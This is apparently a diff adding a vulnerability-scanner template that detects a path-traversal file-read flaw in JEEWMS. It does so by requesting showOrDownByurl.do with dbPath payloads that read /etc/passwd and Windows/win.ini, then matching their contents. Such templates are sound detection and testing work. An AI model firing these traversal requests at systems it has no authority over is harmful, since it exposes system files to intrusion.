@@ -1,0 +1,24 @@
+id: jeewms-showordownbyurl-fileread
+
+info:
+    name: jeewms-showordownbyurl-fileread
+    author: B1anda0(https://github.com/B1anda0)
+    severity: high
+
+manual: true
+transport: http
+rules:
+    linux0:
+        request:
+            cache: true
+            method: GET
+            path: /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    windows0:
+        request:
+            cache: true
+            method: GET
+            path: /systemController/showOrDownByurl.do?down=&dbPath=../../../../../Windows/win.ini
+        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+expression: linux0() || windows0()
+
